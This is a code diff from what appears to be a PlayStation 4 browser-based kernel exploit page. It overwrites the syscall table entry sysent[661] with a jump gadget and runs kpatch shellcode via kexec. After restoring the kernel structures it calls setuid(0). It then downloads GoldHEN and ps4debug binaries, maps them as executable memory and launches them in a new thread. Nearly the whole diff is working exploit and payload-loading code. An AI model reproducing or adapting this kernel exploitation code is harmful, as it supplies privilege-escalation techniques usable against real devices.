@@ -1542,9 +1542,9 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     for (let off = 0; off < sysent_661_save.size; off += 8) {
         sysent_661_save.write64(off, kmem.read64(sysent_661.add(off)));
     }
-    log(`sysent[611] save addr: ${sysent_661_save.addr}`);
-    log("sysent[611] save data:");
-    hexdump(sysent_661_save);
+    log(`sysent[661] save addr: ${sysent_661_save.addr}`);
+    log("sysent[661] save data:");
+    // hexdump(sysent_661_save);
     // .sy_narg = 6
     kmem.write32(sysent_661, 6);
     // .sy_call = gadgets['jmp qword ptr [rsi]']
@@ -1609,38 +1609,39 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
         die("test jit exec failed");
     }
 
-    log("mlock saved data for kernel restore");
-    const pipe_save = restore_info[1];
-    restore_info[1] = pipe_save.addr;
-    sysi("mlock", restore_info[1], page_size);
-    restore_info[4] = sysent_661_save.addr;
-    sysi("mlock", restore_info[4], page_size);
-
     log("execute kpatch...");
     mem.cpy(write_addr, patches.addr, patches.size);
-    sys_void("kexec", exec_addr, ...restore_info);
+    // ELF only runs do_patch() — restores are handled by JS below
+    sys_void("kexec", exec_addr);
 
-    // Explicitly close everything, it should happen implicitly already... did
-    // not fix blackscreen issue.
+    // RESTORE sysent[661] first, immediately after kexec returns,
+    // to minimize the window where syscall 661 points to jmp [rsi]
+    log("restore sysent[661]");
+    for (let off = 0; off < sysent_661_save.size; off += 8) {
+        kmem.write64(sysent_661.add(off), sysent_661_save.read64(off));
+    }
+    log("sysent[661] restored");
+	
+    // RESTORE pktinfo fields (cleanup from restricted r/w stage)
+    log("restore pktinfo fields");
+    kmem.write64(restore_info[2], 0); // pktinfo_p  (k100_addr + 0x10)
+    kmem.write64(restore_info[3], 0); // w_pktinfo  (w_pktopts + 0x10)
+    log("pktinfo fields zeroed");
 
-    // log("munlock locked data");
-    // sysi("munlock", restore_info[4], page_size);
-    // sysi("munlock", restore_info[1], page_size);
-    // sysi("munlock", exec_addr, map_size);
+    // RESTORE pipebuf (last kmem operation)
+    log("restore pipebuf");
+    const kpipe = restore_info[0];
+    const pipe_save = restore_info[1]; // Buffer object, not .addr
+    for (let off = 0; off < 0x18; off += 8) {
+        kmem.write64(kpipe.add(off), pipe_save.read64(off));
+    }
+    log("pipebuf restored");
 
-    // log("munmap kpatch shellcode memory");
-    // sysi("munmap", write_addr, map_size);
-    // sysi("munmap", exec_addr, map_size);
-
-    // One works, both cause an OOM error, then works as it reloads because it kpatched properly
-    // log("close JIT fds");
-    // close(write_fd);
-    // close(exec_fd);
-    log('setuid(0)');
+    log("setuid(0)");
     sysi('setuid', 0);
     log('kernel exploit succeeded!');
-    localStorage.ExploitLoaded="yes";
-    sessionStorage.ExploitLoaded="yes";
+    localStorage.ExploitLoaded = "yes";
+    sessionStorage.ExploitLoaded = "yes";
 }
 
 // FUNCTIONS FOR STAGE: SETUP
@@ -1696,6 +1697,7 @@ export async function kexploit() {
     
     if (localStorage.ExploitLoaded === "yes" && sessionStorage.ExploitLoaded != "yes") {
         msgs.innerHTML = "GoldHEN is Already Loaded ...";
+        if (typeof window.kzSetGoldhenActive === "function") window.kzSetGoldhenActive(true);
         return new Promise(() => {});
     }
  
@@ -1798,84 +1800,89 @@ function array_from_address(addr, size) {
     return og_array;
 }
 
-function runPayload(PLfile, onSubmitted) {
+function runPayload(PLfile, onSubmitted, onError, minBytes) {
   var loader_addr = chain.sysp('mmap', 0, 0x1000, 7, 0x41000, -1, 0);
   var tmpStubArray = array_from_address(loader_addr, 1);
   tmpStubArray[0] = 0x00C3E7FF;
 
   var req = new XMLHttpRequest();
   req.responseType = "arraybuffer";
-  req.open('GET', PLfile);
-  req.send();
-
+  req.open('GET', PLfile, true);
   req.onreadystatechange = function () {
-    if (req.readyState == 4) {
-      if (req.status === 200 && req.response) {
+    if (req.readyState !== 4) return;
+    if (req.status === 200 && req.response) {
+      if (minBytes && req.response.byteLength < minBytes) {
+        if (typeof onError === 'function') onError(new Error('Payload file is missing or incomplete.'));
+        return;
+      }
+      try {
         var PLD = req.response;
         var payload_buffer = chain.sysp('mmap', 0, PLD.byteLength * 4, 7, 0x1002, -1, 0);
         var pl = array_from_address(payload_buffer, PLD.byteLength * 4);
-        var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
+        var padding = new Uint8Array((4 - (req.response.byteLength % 4)) % 4);
         var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
         tmp.set(new Uint8Array(req.response), 0);
         tmp.set(padding, req.response.byteLength);
         var shellcode = new Uint32Array(tmp.buffer);
         pl.set(shellcode, 0);
         var pthread = malloc(0x10);
-
         call_nze('pthread_create', pthread, 0, loader_addr, payload_buffer);
-        // Payload thread creation succeeded. This is NOT confirmation of payload initialization.
         if (typeof onSubmitted === 'function') onSubmitted();
+      } catch (err) {
+        if (typeof onError === 'function') onError(err);
+        else hostFail();
       }
+    } else {
+      var loadError = new Error('Could not load payload: HTTP ' + req.status);
+      if (typeof onError === 'function') onError(loadError);
+      else hostFail();
     }
   };
+  req.onerror = function () {
+    var networkError = new Error('Network error while loading payload.');
+    if (typeof onError === 'function') onError(networkError);
+    else hostFail();
+  };
+  req.send();
 }
 
-// KAZANOVA experimental ps4debug test page.
-// KAZANOVA: expose the existing exploited loader on this SAME page.
-// No page navigation or extra jailbreak attempt is triggered by the button.
 let kzDebugRequestInFlight = false;
-let kzGoldhenLaunchRequested = false;
-window.kzLaunchDebugPayload = function (status) {
-    if (!kzGoldhenLaunchRequested) {
-        status('لم يكتمل طلب تحميل GoldHEN بعد.', true); return;
-    }
-    if (kzDebugRequestInFlight) {
-        status('جارٍ محاولة تشغيل PS4Debug بالفعل.', true); return;
-    }
+window.kzRegisterDebugLauncher(function () {
+  return new Promise(function (resolve, reject) {
+    if (kzDebugRequestInFlight) { reject(new Error('جارٍ تشغيل PS4Debug بالفعل.')); return; }
     kzDebugRequestInFlight = true;
-    var check = new XMLHttpRequest();
-    check.open('GET', './ps4debug-NG.bin', true);
-    check.responseType = 'arraybuffer';
-    check.onload = function () {
-        if (check.status !== 200 || !check.response || check.response.byteLength < 1000000) {
-            kzDebugRequestInFlight = false;
-            status('ملف ps4debug-NG.bin غير موجود أو غير مكتمل في g2all.', true);
-            return;
-        }
-        try {
-            runPayload('./ps4debug-NG.bin');
-            status('تم طلب تشغيل PS4Debug؛ تحقق من المنفذ 744 على الكمبيوتر.', false);
-        } catch (err) {
-            kzDebugRequestInFlight = false;
-            status('فشل طلب التشغيل: ' + String(err), true);
-        }
-    };
-    check.onerror = function () {
-        kzDebugRequestInFlight = false;
-        status('تعذّر الوصول إلى ملف ps4debug-NG.bin.', true);
-    };
-    check.send();
-};
+    runPayload('./ps4debug-NG.bin', function () {
+      kzDebugRequestInFlight = false;
+      resolve('تم إرسال طلب تشغيل PS4Debug. تحقق من اتصال عميل التصحيح على الجهاز.');
+    }, function (err) {
+      kzDebugRequestInFlight = false;
+      reject(err);
+    }, 1000000);
+  });
+}, function () {
+  try { return chain.sysi('setuid', 0) === 0 && chain.sysi('getuid') === 0; }
+  catch (e) { return false; }
+});
+
+function hostFail() {
+    msgs.innerHTML = "Failed to Load! Restart Your Console ...";
+    msgs.style.color = "yellow";
+}
 
 kexploit().then(() => {
     setTimeout(() => {
-        runPayload('./goldhen_2.4b18.12.bin', function () {
-            kzGoldhenLaunchRequested = true;
-            msgs.innerHTML = 'GoldHEN payload launch requested. Confirm it loaded before using PS4Debug.';
-            if (typeof window.kzRevealDebugButton === 'function') window.kzRevealDebugButton();
-        });
+        try {
+            runPayload("./goldhen_2.4b18.14.bin", function () {
+                msgs.innerHTML = "GoldHEN v2.4b18.14 Loaded ...";
+                if (typeof window.kzSetGoldhenActive === "function") window.kzSetGoldhenActive(true);
+            }, function (err) {
+                hostFail();
+                if (typeof window.kzSetGoldhenActive === "function") window.kzSetGoldhenActive(false);
+            });
+        } catch (e) {
+            hostFail();
+        }
     }, 500);
-}).catch((err) => {
-    msgs.innerHTML = 'Failed to Load! Restart Your Console ...';
-    msgs.style.color = 'yellow';
+}).catch(() => {
+    hostFail();
 });
